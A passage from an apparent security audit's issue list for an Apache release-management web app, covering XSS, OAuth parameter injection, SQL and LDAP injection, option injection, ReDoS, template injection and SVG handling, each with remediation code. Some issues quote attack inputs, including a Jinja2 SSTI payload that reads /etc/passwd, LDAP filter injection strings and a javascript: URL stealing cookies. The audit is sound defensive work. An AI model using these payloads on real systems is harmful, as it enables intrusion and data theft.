- [ ] Monitoring alerts on certificate verification failures

### References
- Source reports: L2:12.3.2.md, L2:12.3.3.md, L2:12.3.4.md
- Related findings: FINDING-094
- ASVS sections: 12.3.2, 12.3.3, 12.3.4

### Priority
High

---

## Issue: FINDING-096 - Unsanitized Markdown-to-HTML Rendering in Release Checklist Bypasses Auto-Escaping

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The application renders committee-controlled Markdown content as HTML without sanitization in the release checklist feature. The cmarkgfm.github_flavored_markdown_to_html() function preserves raw HTML elements embedded in Markdown. By wrapping the output with markupsafe.Markup(), the application explicitly marks this content as 'safe,' bypassing Jinja2's auto-escaping protections. This allows content spoofing, CSS injection, link injection, and form injection affecting all users viewing the release checklist.

### Details
In atr/get/checklist.py lines 79-80, the data flow is:

1. project.policy_release_checklist (Database - committee member controlled)
2. construct.checklist_body() template substitution
3. cmarkgfm.github_flavored_markdown_to_html() conversion
4. markupsafe.Markup() marking as safe
5. Rendered unescaped to browser

Committee members can embed HTML in checklist Markdown that will be rendered to all users viewing releases. While XSS is prevented by CSP, content spoofing and CSS injection remain possible.

### Recommended Remediation
**Option A:** Use cmarkgfm's safe mode with CMARK_OPT_SAFE flag to strip HTML.

**Option B (Recommended):** Apply HTML sanitizer (nh3 or bleach) after conversion with allowlist:

```python
import nh3

# Safe tags for release checklists
ALLOWED_TAGS = {
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'ul', 'ol', 'li',
    'a', 'code', 'pre', 'em', 'strong',
    'blockquote', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'br', 'hr',
    'input',  # For checklist items
}

ALLOWED_ATTRIBUTES = {
    'a': {'href'},
    'input': {'type', 'disabled', 'checked'},
}

ALLOWED_PROTOCOLS = {'https', 'http'}

html = cmarkgfm.github_flavored_markdown_to_html(markdown_text)
sanitized_html = nh3.clean(
    html,
    tags=ALLOWED_TAGS,
    attributes=ALLOWED_ATTRIBUTES,
    url_schemes=ALLOWED_PROTOCOLS,
)
return markupsafe.Markup(sanitized_html)
```

### Acceptance Criteria
- [ ] HTML sanitizer is applied to Markdown-generated HTML
- [ ] Only safe tags are allowed (headers, paragraphs, lists, links, code, etc.)
- [ ] Only safe attributes are allowed (href, type, disabled, checked)
- [ ] Only safe URL schemes are allowed (https, http)
- [ ] Raw HTML in Markdown is stripped or sanitized
- [ ] Legitimate checklist formatting still works
- [ ] Unit tests verify sanitization
- [ ] XSS attempts are blocked

### References
- Source reports: L1:1.2.1.md
- Related findings: FINDING-026, FINDING-321
- ASVS sections: 1.2.1

### Priority
Medium

---

## Issue: FINDING-097 - DOM-based HTML Injection via innerHTML with Server-Rendered Fragments

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
The application uses innerHTML to inject server-rendered HTML fragments into the DOM in ongoing-tasks-poll.js updatePageContent() function. While server-side rendering uses htpy (which auto-escapes), the client-side insertion via innerHTML creates a cross-boundary trust dependency. If the API endpoint or data flow is compromised, or if future code changes introduce unescaped content, this becomes an XSS vector.

### Details
In atr/static/js/src/ongoing-tasks-poll.js lines 69-74 and 109-117, the code assigns HTML fragments directly to innerHTML:

```javascript
const checksSummaryContainer = document.getElementById('checks-summary');
checksSummaryContainer.innerHTML = data.checks_summary_html;

const filesTableContainer = document.getElementById('files-table');
filesTableContainer.innerHTML = data.files_table_html;
```

Data flows from:
1. API endpoint /checks/<project_key>/<version_key>/<revision_number>
2. JSON response containing checks_summary_html and files_table_html
3. Direct assignment to element.innerHTML with no client-side sanitization

While the server-side htpy library auto-escapes content, there is no client-side defense if the server-side protection fails or is bypassed.

### Recommended Remediation
**Option 1 (Recommended):** Use DOMParser with replaceChildren() to safely parse and insert HTML fragments:

```javascript
function updatePageContent(data) {
    const parser = new DOMParser();
    
    // Parse and insert checks summary
    const checksSummaryDoc = parser.parseFromString(
        data.checks_summary_html,
        'text/html'
    );
    const checksSummaryContainer = document.getElementById('checks-summary');
    checksSummaryContainer.replaceChildren(...checksSummaryDoc.body.childNodes);
    
    // Parse and insert files table
    const filesTableDoc = parser.parseFromString(
        data.files_table_html,
        'text/html'
    );
    const filesTableContainer = document.getElementById('files-table');
    filesTableContainer.replaceChildren(...filesTableDoc.body.childNodes);
}
```

**Option 2:** Use DOMPurify library:

```javascript
import DOMPurify from 'dompurify';

checksSummaryContainer.innerHTML = DOMPurify.sanitize(
    data.checks_summary_html,
    {ALLOWED_TAGS: ['div', 'span', 'p', 'table', 'tr', 'td', 'th', ...]}
);
```

**Option 3 (Best long-term):** Return structured JSON data instead of pre-rendered HTML fragments and build DOM client-side using safe APIs.

### Acceptance Criteria
- [ ] HTML fragments are sanitized before DOM insertion
- [ ] DOMParser or DOMPurify is used instead of direct innerHTML
- [ ] XSS attempts via compromised API response are blocked
- [ ] Legitimate HTML rendering still works correctly
- [ ] Unit tests verify sanitization
- [ ] Integration tests verify UI functionality

### References
- Source reports: L1:1.2.1.md, L1:1.2.3.md, L2:1.3.3.md
- Related findings: FINDING-026
- ASVS sections: 1.2.1, 1.2.3, 1.3.3

### Priority
Medium

---

## Issue: FINDING-098 - OAuth Authorization Code Parameter Not URL-Encoded in Token Exchange Request

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
The OAuth authorization code parameter is not URL-encoded before being interpolated into the token exchange request URL to oauth.apache.org. While urllib.parse.quote() is imported and used extensively in the same file for other OAuth parameters, it is not applied to the 'code' parameter at line 97. This allows an attacker to inject additional query parameters into the token exchange request. Per RFC 6749 §4.1.2, authorization codes can contain any printable ASCII character including &, =, ?, and #, which enables parameter injection attacks.

### Details
In src/asfquart/generics.py line 97:

```python
rv = await session.get(OAUTH_URL_CALLBACK % code)  # code not URL-encoded
```

The OAUTH_URL_CALLBACK likely contains %s placeholder where code is directly interpolated without encoding. If the authorization code contains special characters like & or ?, it could inject additional query parameters:

Example malicious code: `legitimate_code&extra_param=malicious_value`

### Recommended Remediation
Apply urllib.parse.quote() to the OAuth code parameter before URL interpolation:

```python
import urllib.parse

# Encode the authorization code
encoded_code = urllib.parse.quote(code, safe='')

# Use encoded code in request
rv = await session.get(OAUTH_URL_CALLBACK % encoded_code)
```

Additionally, consider using create_secure_session() from atr/util.py instead of plain aiohttp.ClientSession to enforce TLS 1.2+, explicit certificate verification, hostname checking, and secure cipher suite selection for defense-in-depth (see FINDING-094).

### Acceptance Criteria
- [ ] Authorization code is URL-encoded before use in URL
- [ ] urllib.parse.quote() with safe='' is used
- [ ] Parameter injection via special characters is prevented
- [ ] OAuth flow still works correctly with encoded parameters
- [ ] Unit tests verify encoding of special characters
- [ ] Integration tests verify OAuth token exchange

### References
- Source reports: L1:1.2.2.md, L2:1.3.6.md
- Related findings: FINDING-099
- ASVS sections: 1.2.2, 1.3.6

### Priority
Medium

---

## Issue: FINDING-099 - OAuth Callback Missing Hardened TLS Configuration

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The OAuth callback endpoint creates a plain aiohttp.ClientSession instead of using create_secure_session(), missing TLS 1.2+ enforcement, explicit certificate verification, hostname checking, and secure cipher suite selection. This creates a potential man-in-the-middle vulnerability in the OAuth token exchange flow.

### Details
In src/asfquart/generics.py line 98:

```python
async with aiohttp.ClientSession() as session:
    rv = await session.get(OAUTH_URL_CALLBACK % code)
```

The application has a create_secure_session() utility function (likely in atr/util.py) that provides:
- TLS 1.2+ minimum version enforcement
- ssl.CERT_REQUIRED for certificate verification
- check_hostname=True for hostname verification
- Secure cipher suite selection

The OAuth token exchange bypasses these hardening measures, creating inconsistent security posture for this critical authentication operation.

### Recommended Remediation
Use create_secure_session() for hardened TLS configuration:

```python
from atr import util

encoded_code = urllib.parse.quote(code, safe='')
async with util.create_secure_session(
    timeout=aiohttp.ClientTimeout(sock_read=15)
) as session:
    rv = await session.get(OAUTH_URL_CALLBACK % encoded_code)
```

This ensures OAuth token exchange uses the same hardened TLS configuration as other HTTP client operations in the application.

### Acceptance Criteria
- [ ] OAuth token exchange uses create_secure_session()
- [ ] TLS 1.2+ is enforced for OAuth connections
- [ ] Certificate verification is enabled (CERT_REQUIRED)
- [ ] Hostname verification is enabled (check_hostname=True)
- [ ] Secure cipher suites are configured
- [ ] Timeout is configured for socket operations
- [ ] Unit tests verify TLS configuration
- [ ] Integration tests verify OAuth still works

### References
- Source reports: L2:1.3.6.md
- Related findings: FINDING-098
- ASVS sections: 1.3.6

### Priority
Medium

---

## Issue: FINDING-100 - Missing URL Protocol Validation for Third-Party Distribution URLs Rendered in HTML

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
URLs from third-party API responses (NPM, ArtifactHub, PyPI) are rendered as clickable HTML links without protocol validation. The distribution_web_url() function extracts URLs directly from API responses (e.g., NPM homepage field, ArtifactHub home_url and links, PyPI release_url/project_url) and stores them in the database. An attacker could publish a package with a javascript: or data: URL in the homepage field, which would be stored and later execute in users' browsers when they view the distribution page, resulting in stored XSS.

### Details
In atr/shared/distribution.py:
- Lines 161-202: distribution_web_url() extracts URLs from API responses
- Line 248: URLs stored in database without validation
- atr/get/distribution.py line 105: URLs rendered via html_tr_a() as <a href> elements

Jinja2 auto-escaping prevents breaking out of HTML attributes but does NOT prevent javascript: protocol execution in href attributes.

Attack scenario:
1. Attacker publishes NPM package with homepage: "javascript:alert(document.cookie)"
2. Application fetches NPM metadata and stores malicious URL
3. User views distribution page
4. <a href="javascript:alert(document.cookie)"> renders and executes on click

### Recommended Remediation
Create a centralized URL protocol validation function and apply it to all third-party URLs:

```python
_SAFE_URL_SCHEMES = frozenset({'http', 'https'})

def validate_url_protocol(url: str) -> str | None:
    """Validate URL protocol is safe. Returns URL or None."""
    try:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme.lower() in _SAFE_URL_SCHEMES:
            return url
        else:
            log.warning(f"Rejected unsafe URL scheme: {parsed.scheme}")
            return None
    except Exception as e:
        log.warning(f"Invalid URL: {e}")
        return None

# Apply in distribution_web_url() for all cases
url = validate_url_protocol(extracted_url)
if not url:
    return None

# Add defense-in-depth at render layer in html_tr_a()
def html_tr_a(url: str, text: str) -> html:
    url = validate_url_protocol(url)
    if not url:
        return text  # Return plain text if URL is unsafe
    return htpy.a(href=url)[text]
```

### Acceptance Criteria
- [ ] All third-party URLs are validated before storage
- [ ] Only http:// and https:// schemes are allowed
- [ ] javascript:, data:, file:, etc. schemes are rejected
- [ ] Invalid URLs log warning and return None
- [ ] Defense-in-depth validation at render layer
- [ ] Unit tests verify URL scheme validation
- [ ] XSS attempts via javascript: URLs are blocked

### References
- Source reports: L1:1.2.2.md
- Related findings: FINDING-101
- ASVS sections: 1.2.2

### Priority
Medium

---

## Issue: FINDING-101 - Missing URL Protocol Validation for SBOM Supplier URLs

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The supplier_op_from_url() function in SBOM conformance processing accepts URLs from deps.dev API responses without protocol validation. When processing SBOM documents, the system queries the deps.dev API for Maven package homepage URLs and extracts the URL from the 'HOMEPAGE' link label. A javascript: or data: URL from the deps.dev API would be stored in the SBOM supplier URL field. If this data is later rendered in a web context with the URL as a clickable link, it could enable stored XSS.

### Details
In atr/sbom/conformance.py:
- Lines 104-115: supplier_op_from_url() extracts URLs from deps.dev API
- Lines 124-132: Fallback case accepts ANY URL without validation

The fallback case:
```python
else:
    # Fallback: use URL as both name and URL
    return name_op, url  # No validation of URL protocol
```

Attack scenario:
1. Malicious package metadata on deps.dev contains javascript: URL
2. Application fetches metadata and stores malicious URL in SBOM
3. SBOM supplier URL is rendered in web UI as clickable link
4. User clicks link, javascript: executes

### Recommended Remediation
Add protocol validation to supplier_op_from_url():

```python
def supplier_op_from_url(url: str) -> tuple[str | None, str | None]:
    """Extract supplier name and URL from homepage URL."""
    try:
        parsed = urllib.parse.urlparse(url)
        
        # Validate protocol
        if parsed.scheme.lower() not in ('http', 'https'):
            log.warning(f"Rejected unsafe URL scheme in SBOM: {parsed.scheme}")
            return None, None
        
        # Rest of existing extraction logic
        if parsed.netloc == 'github.com':
            # ...
        else:
            return None, url  # Return validated URL
            
    except Exception as e:
        log.warning(f"Invalid URL in SBOM: {e}")
        return None, None
```

This prevents javascript:, data:, file:, and other dangerous protocols from being stored and potentially rendered.

### Acceptance Criteria
- [ ] supplier_op_from_url() validates URL protocol
- [ ] Only http:// and https:// schemes are allowed
- [ ] javascript:, data:, file:, etc. schemes are rejected
- [ ] Function returns None for invalid URLs
- [ ] Unit tests verify URL scheme validation
- [ ] SBOM processing rejects unsafe URLs
- [ ] XSS via SBOM supplier URLs is prevented

### References
- Source reports: L1:1.2.2.md
- Related findings: FINDING-100
- ASVS sections: 1.2.2

### Priority
Medium

---

## Issue: FINDING-102 - SQL Identifier Injection in SQLite Database Wrapper

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The DB class in asfpy/sqlite.py constructs SQL statements by directly interpolating table names and dictionary keys (representing column names) into SQL strings via f-strings and %s formatting. While values are correctly parameterized using ? placeholders, identifiers (table names, column names, LIMIT clauses) receive no sanitization, escaping, or allowlist validation. This creates SQL injection vulnerability if table/column names or limit values are derived from user input. No active exploitation path identified in ATR application as it uses SQLAlchemy/SQLModel exclusively.

### Details
In asfpy/sqlite.py:
- Line 66: delete() - table name in f-string
- Line 78: update() - table name and column names in f-string
- Line 94: insert() - table name and column names in f-string
- Line 106: upsert() - table name and column names in f-string
- Line 135: fetch() - table name, column names, limit in f-string

Example vulnerable code:
```python
def delete(self, table: str, **conditions):
    sql = f"DELETE FROM {table} WHERE ..."  # table not escaped
```

While ATR doesn't use this module, it exists in the bundled asfpy library and represents a security risk if ever used.

### Recommended Remediation
Add identifier validation and quoting:

```python
import re

_IDENTIFIER_PATTERN = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')

def _validate_identifier(identifier: str) -> str:
    """Validate and return identifier or raise ValueError."""
    if not _IDENTIFIER_PATTERN.match(identifier):
        raise ValueError(f"Invalid SQL identifier: {identifier}")
    return identifier

def _quote_identifier(identifier: str) -> str:
    """Quote SQL identifier with double-quotes per SQL-92."""
    _validate_identifier(identifier)
    return f'"{identifier}"'

# Apply to all methods:
def delete(self, table: str, **conditions):
    table = _quote_identifier(table)
    columns = [_quote_identifier(k) for k in conditions.keys()]
    sql = f"DELETE FROM {table} WHERE ..."

# Fix limit parameter to use ? placeholder:
def fetch(self, table: str, limit: int = None, **conditions):
    sql = f"SELECT * FROM {_quote_identifier(table)} WHERE ... LIMIT ?"
    self.cursor.execute(sql, (*values, limit))
```

### Acceptance Criteria
- [ ] All table names are validated and quoted
- [ ] All column names are validated and quoted
- [ ] Limit parameter is parameterized (not interpolated)
- [ ] Regex validation rejects invalid identifiers
- [ ] Double-quote escaping is SQL-92 compliant
- [ ] Unit tests verify identifier validation
- [ ] Unit tests verify SQL injection is prevented
- [ ] Existing functionality remains unchanged

### References
- Source reports: L1:1.2.4.md
- Related findings: None
- ASVS sections: 1.2.4

### Priority
Medium

---

## Issue: FINDING-103 - LDAP Filter Injection in Account Lookup Function (Multiple Files)

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
Multiple LDAP account lookup methods construct LDAP search filters by directly interpolating the uid parameter without validation or escaping. In asfpy/ldapadmin.py, the manager.load_account() method lacks UID validation despite LDAP_VALID_UID_RE being defined and used in other methods. In atr/principal.py, the _get_project_memberships() method uses string interpolation without escape_filter_chars(). This allows LDAP filter manipulation, information disclosure, potential authentication/authorization bypass, and enumeration attacks.

### Details
Affected locations:
- asfpy/ldapadmin.py line 186: manager.load_account() lacks UID validation
- atr/principal.py line 142: _get_project_memberships() uses unescaped UID

Example vulnerable code:
```python
# asfpy/ldapadmin.py
def load_account(self, uid: str):
    # LDAP_VALID_UID_RE is defined but NOT used here
    filter_str = f"(uid={uid})"  # Direct interpolation, no escaping
    
# atr/principal.py
def _get_project_memberships(uid: str):
    filter_str = f"(memberUid={uid})"  # Direct interpolation
```

Attack examples:
- `uid=*)(|(uid=*` - Enumerate all accounts
- `uid=admin)(objectClass=*)#` - Information disclosure
- `uid=*` - Wildcard match

### Recommended Remediation
Apply defense-in-depth with two layers:

**Layer 1 - Allowlist validation:**
```python
# In asfpy/ldapadmin.py
def load_account(self, uid: str):
    if not LDAP_VALID_UID_RE.match(uid):
        raise ValueError(f"Invalid UID format: {uid}")
    # Continue with query
```

**Layer 2 - LDAP filter escaping:**
```python
from ldap.filter import escape_filter_chars
# or: from ldap3.utils.conv import escape_filter_chars

def load_account(self, uid: str):
    if not LDAP_VALID_UID_RE.match(uid):
        raise ValueError(f"Invalid UID format: {uid}")
    escaped_uid = escape_filter_chars(uid)
    filter_str = f"(uid={escaped_uid})"

# In atr/principal.py
def _get_project_memberships(uid: str):
    escaped_uid = escape_filter_chars(uid)
    filter_str = f"(memberUid={escaped_uid})"
```

### Acceptance Criteria
- [ ] load_account() validates UID with LDAP_VALID_UID_RE
- [ ] _get_project_memberships() validates UID format
- [ ] Both functions escape UID with escape_filter_chars()
- [ ] LDAP filter injection attempts are blocked
- [ ] Unit tests verify validation and escaping
- [ ] Wildcard and partial match queries are prevented
- [ ] Legitimate LDAP queries still work

### References
- Source reports: L1:1.2.4.md, L2:1.2.6.md, L2:1.3.8.md
- Related findings: FINDING-322
- ASVS sections: 1.2.4, 1.2.6, 1.3.8

### Priority
Medium

---

## Issue: FINDING-104 - Missing `--` Separator and Unsafe Argument Order in `sbomqs` Execution

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The sbomqs command execution places the filename as a positional argument before the --json flag without using a -- separator. This creates a vulnerability where filenames starting with - could be interpreted as command-line options rather than file arguments. A file named -version.cdx.json would pass safe.RelPath validation (hyphen is allowed) but be interpreted as a flag.

### Details
In atr/tasks/sbom.py lines 157-164, the vulnerable code executes:

```python
proc = await asyncio.create_subprocess_exec(
    'sbomqs',
    'score',
    full_path.name,  # Filename BEFORE flags, no -- separator
    '--json',
    ...
)
```

Attack scenario:
1. User uploads archive containing file named `-version.cdx.json`
2. File passes safe.RelPath validation (hyphen allowed)
3. Command becomes: `sbomqs score -version.cdx.json --json`
4. `-version.cdx.json` interpreted as flag, not filename

While parameterized execution prevents shell injection, the lack of -- separator allows option injection.

### Recommended Remediation
Place flags before the filename and add -- separator:

```python
proc = await asyncio.create_subprocess_exec(
    'sbomqs',
    'score',
    '--json',      # Flags BEFORE filename
    '--',          # Separator to indicate end of options
    full_path.name,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
)
```

Additionally, add Pydantic field validator to re-validate file_path at deserialization:

```python
class ScoreArgs(pydantic.BaseModel):
    file_path: str
    
    @pydantic.field_validator('file_path')
    @classmethod
    def validate_file_path(cls, v: str) -> str:
        safe.RelPath(v)  # Re-validate at deserialization
        return v
```

### Acceptance Criteria
- [ ] Flags are placed before filename in command
- [ ] -- separator is used to indicate end of options
- [ ] Filenames starting with - are treated as filenames, not flags
- [ ] Pydantic validator re-validates file_path at deserialization
- [ ] Unit tests verify handling of filenames starting with -
- [ ] sbomqs scoring still works correctly
- [ ] Command injection attempts are blocked

### References
- Source reports: L1:1.2.5.md
- Related findings: FINDING-323
- ASVS sections: 1.2.5

### Priority
Medium

---

## Issue: FINDING-105 - User Input Used Directly as RegExp Without Escaping in Project Directory Filter

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
User input from the project filter textbox is passed directly to `new RegExp()` without escaping special characters, allowing regex metacharacters to be interpreted as pattern syntax rather than literal characters. This creates a ReDoS vulnerability where patterns like `(a+)+` can cause catastrophic backtracking and browser unresponsiveness. Invalid regex characters (e.g., `[`, `(`) cause unhandled exceptions, breaking the filter functionality entirely.

### Details
In atr/static/js/src/projects-directory.js lines 25-31:

```javascript
const projectFilter = document.getElementById('project-filter').value;
const regex = new RegExp(projectFilter, 'i');  // No escaping!

projectRows.forEach(row => {
    const projectName = row.dataset.projectName;
    if (regex.test(projectName)) {
        row.style.display = '';
    } else {
        row.style.display = 'none';
    }
});
```

Vulnerabilities:
1. **ReDoS:** Input `(a+)+` causes catastrophic backtracking
2. **Syntax errors:** Input `[` causes unhandled exception
3. **Unexpected behavior:** `.` matches any character, not literal dot

### Recommended Remediation
Apply escaping to all regex special characters before constructing the RegExp object:

```javascript
// Escape all regex special characters
const escapedFilter = projectFilter.replaceAll(
    /[.*+?^${}()|[\]\\]/g,
    '\\$&'
);
const regex = new RegExp(escapedFilter, 'i');
```

**Alternative:** Use String.includes() for simple text search instead of regex:

```javascript
const projectFilter = document.getElementById('project-filter').value.toLowerCase();

projectRows.forEach(row => {
    const projectName = row.dataset.projectName.toLowerCase();
    if (projectName.includes(projectFilter)) {
        row.style.display = '';
    } else {
        row.style.display = 'none';
    }
});
```

### Acceptance Criteria
- [ ] User input is escaped before regex construction
- [ ] ReDoS patterns do not cause browser hang
- [ ] Invalid regex characters do not cause exceptions
- [ ] Literal text search works as expected
- [ ] Special characters like . are treated literally
- [ ] Unit tests verify escaping of special characters
- [ ] Filter functionality remains usable

### References
- Source reports: L2:1.2.9.md, L2:1.3.3.md
- Related findings: FINDING-324
- ASVS sections: 1.2.9, 1.3.3

### Priority
Medium

---

## Issue: FINDING-106 - Unsandboxed render_string_sync API Allows Arbitrary Jinja2 Template Compilation

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
The render_string_sync function accepts arbitrary strings and compiles them as Jinja2 templates using a non-sandboxed jinja2.Environment. This function is exported as a public API (render_string) without input validation, sanitization, or sandboxing, creating a potential Server-Side Template Injection (SSTI) vector if ever called with user-controlled input. While no current code path feeds user-controlled input to this function, its availability represents a latent Remote Code Execution (RCE) risk for future development.

### Details
In atr/template.py:
- Lines 58-62: render_string_sync() compiles arbitrary strings as Jinja2 templates
- Line 86: Exported as public API render_string
- Lines 44-51: Uses standard jinja2.Environment (not sandboxed)

The function uses a standard Jinja2 environment which would allow full access to Python's object hierarchy, filesystem, and system commands if user input reached it.

Example exploit if user input reaches this function:
```python
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }}
```

### Recommended Remediation
**Priority 1 - Option A (Recommended):** Remove the function entirely if unused, or make it private with security warnings:

```python
def _render_string_sync(source: str, **context) -> str:
    """INTERNAL USE ONLY - DO NOT CALL WITH USER INPUT
    
    This function compiles arbitrary strings as Jinja2 templates without
    sandboxing. It is intended only for trusted, developer-controlled
    template strings.
    """
    ...

# Remove public export
# render_string = render_string_sync  # DELETE THIS
```

**Priority 1 - Option B:** Replace with SandboxedEnvironment:

```python
from jinja2.sandbox import SandboxedEnvironment

jinja_env = SandboxedEnvironment(
    loader=jinja2.FileSystemLoader(searchpath="./templates"),
    autoescape=True,
)
```

**Priority 1 - Option C:** Add runtime validation:

```python
import re

_JINJA_EXPRESSION_PATTERN = re.compile(r'\{\{|\{%|\{#')

def render_string_sync(source: str, **context) -> str:
    if _JINJA_EXPRESSION_PATTERN.search(source):
        raise ValueError("Template expressions not allowed in render_string()")
    ...
```

**Priority 2:** Add CI/lint check to flag any new usage.

### Acceptance Criteria
- [ ] Function is removed, made private, or sandboxed
- [ ] No user-controlled input can reach template compilation
- [ ] Security warning is added if function is retained
- [ ] Public render_string export is removed
- [ ] CI check prevents new usage without security review
- [ ] Documentation warns against user input
- [ ] Unit tests verify protection against SSTI

### References
- Source reports: L1:1.3.2.md, L2:1.3.7.md
- Related findings: None
- ASVS sections: 1.3.2, 1.3.7

### Priority
Medium

---

## Issue: FINDING-107 - Sequential Template Substitution Allows Variable Injection in Email Templates

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The email template construction uses sequential str.replace() operations without escaping template markers ({{...}}) in user-provided content. This allows injection of template variables that expand using the identity of whoever triggers the email, breaking semantic integrity. A committer can set revision tag to {{YOUR_FULL_NAME}} which will then be replaced with the announcer's real name in the final email.

### Details
In atr/construct.py:
- Lines 93-111: announce_email_body() uses sequential replacement
- Lines 106-117: draft_announcement_email_body() uses sequential replacement
- Lines 161-196: checklist_body() uses sequential replacement
- Lines 176-188: format_vote_email_body() uses sequential replacement

Example vulnerability:
```python
# User sets revision_tag to: "RC1 signed by {{YOUR_FULL_NAME}}"
template = template.replace('{{REVISION_TAG}}', revision_tag)
# Later:
template = template.replace('{{YOUR_FULL_NAME}}', announcer_name)
# Result: "RC1 signed by John Smith" (announcer's name, not committer's)
```

This allows semantic injection where user-controlled content from earlier replacements affects later variable expansions.

### Recommended Remediation
**Option 1 (Quick Fix):** Implement _escape_template_vars() function:

```python
def _escape_template_vars(text: str) -> str:
    """Escape template variable syntax in replacement values."""
    return text.replace('{{', '{ {').replace('}}', '} }')

# Apply to all non-URL, non-validated replacement values
def announce_email_body(...):
    # ...
    template = template.replace('{{REVISION_TAG}}', _escape_template_vars(revision_tag))
    template = template.replace('{{YOUR_FULL_NAME}}', your_full_name)
    # ...
```

**Option 2 (Preferred):** Implement single-pass template substitution:

```python
import re

def _substitute_template(template: str, variables: dict) -> str:
    """Single-pass template substitution to prevent injection."""
    pattern = re.compile(r'\{\{(' + '|'.join(re.escape(k) for k in variables.keys()) + r')\}\}')
    
    def replacer(match):
        return variables[match.group(1)]
    
    return pattern.sub(replacer, template)

# Use:
result = _substitute_template(template, {
    'REVISION_TAG': revision_tag,
    'YOUR_FULL_NAME': your_full_name,
    # ...
})
```

### Acceptance Criteria
- [ ] Template variables in user content are escaped or neutralized
- [ ] Earlier substitutions do not affect later variable expansions
- [ ] Email templates render with correct semantic meaning
- [ ] Variable injection attacks are prevented
- [ ] Unit tests verify protection against variable injection
- [ ] Existing email functionality remains unchanged

### References
- Source reports: L2:1.3.3.md, L2:1.3.10.md
- Related findings: None
- ASVS sections: 1.3.3, 1.3.10

### Priority
Medium

---

## Issue: FINDING-108 - Form Fields Bypass Safe Type Validation (Multiple Instances)

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Multiple form fields use plain str type instead of applying the existing SafeType validation system. This is particularly concerning for hidden form fields, which are user-controllable despite being hidden in the UI. The codebase has well-designed safe types (e.g., safe.RevisionNumber, safe.CommitteeKey) but they are not consistently applied. Hidden form fields and admin inputs accept arbitrary strings without character allowlists, violating the principle that all user-controllable input should be validated regardless of UI context.

### Details
Affected locations:
- atr/shared/ignores.py lines 61-82: UpdateIgnoreForm.revision_number uses str instead of safe.OptionalRevisionNumber
- atr/shared/projects.py line 26: AddProjectForm.committee_key uses str instead of safe.CommitteeKey
- atr/admin/__init__.py various: Admin form UIDs accept arbitrary strings

Example vulnerability:
```python
class UpdateIgnoreForm(form.Form):
    revision_number: str | None  # Should use safe.OptionalRevisionNumber
```

This allows:
- Control characters in revision numbers
- Invalid committee key formats
- Unvalidated UIDs in admin operations

### Recommended Remediation
Apply safe types consistently:

```python
# In atr/shared/ignores.py
class UpdateIgnoreForm(form.Form):
    revision_number: safe.OptionalRevisionNumber  # Use safe type

# In atr/shared/projects.py
class AddProjectForm(form.Form):
    committee_key: safe.CommitteeKey  # Use safe type

# In atr/admin/__init__.py
class LdapLookupForm(form.Form):
    uid: pydantic.Field(
        ...,
        pattern=r'^[-_a-z0-9]+$',
        min_length=3,
        max_length=64
    )
```

Create OptionalRevisionNumber type alias if it doesn't exist:
```python
OptionalRevisionNumber = RevisionNumber | None
```

### Acceptance Criteria
- [ ] UpdateIgnoreForm.revision_number uses safe.OptionalRevisionNumber
- [ ] AddProjectForm.committee_key uses safe.CommitteeKey
- [ ] Admin form UIDs have pattern validators
- [ ] All safe type validations are applied
- [ ] Unit tests verify validation is enforced
- [ ] Invalid input is rejected with clear error messages
- [ ] Hidden fields are validated same as visible fields

### References
- Source reports: L2:1.3.3.md
- Related findings: FINDING-323
- ASVS sections: 1.3.3

### Priority
Medium

---

## Issue: FINDING-109 - No SVG Sanitization Library or Function Exists in Codebase

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The entire codebase contains zero SVG sanitization logic—no library (e.g., bleach, DOMPurify, defusedxml, svg-sanitizer), no tag/attribute allowlist, and no function that strips <script>, <foreignObject>, onclick, or other dangerous SVG elements/attributes. Jinja2 auto-escaping prevents injection in template variables but does not sanitize SVG files or SVG content embedded in served HTML. If any current or future code path serves user-influenced SVG content to a browser, an attacker could embed <script>, <foreignObject>, or event handler attributes to achieve XSS.

### Details
The application documents seven defense layers in input-validation.md, but none address SVG content sanitization. SVG files can contain:
- `<script>` tags with JavaScript
- `<foreignObject>` with embedded HTML/JavaScript
- Event handler attributes (onclick, onload, etc.)
- `javascript:` URIs in href attributes
- Data URIs with executable content

If user-influenced SVG reaches a browser (as image/svg+xml or inline in HTML), XSS is possible.

### Recommended Remediation
Create an SVG sanitization function using defusedxml or similar library:

```python
# atr/svg_sanitize.py
import xml.etree.ElementTree as ET
from defusedxml import ElementTree as DefusedET

SAFE_SVG_TAGS = {
    'svg', 'g', 'path', 'circle', 'ellipse', 'line', 'polyline', 'polygon',
    'rect', 'text', 'tspan', 'defs', 'use', 'symbol', 'clipPath', 'mask',
    'pattern', 'linearGradient', 'radialGradient', 'stop',
    'title', 'desc', 'metadata'
}

DANGEROUS_TAGS = {
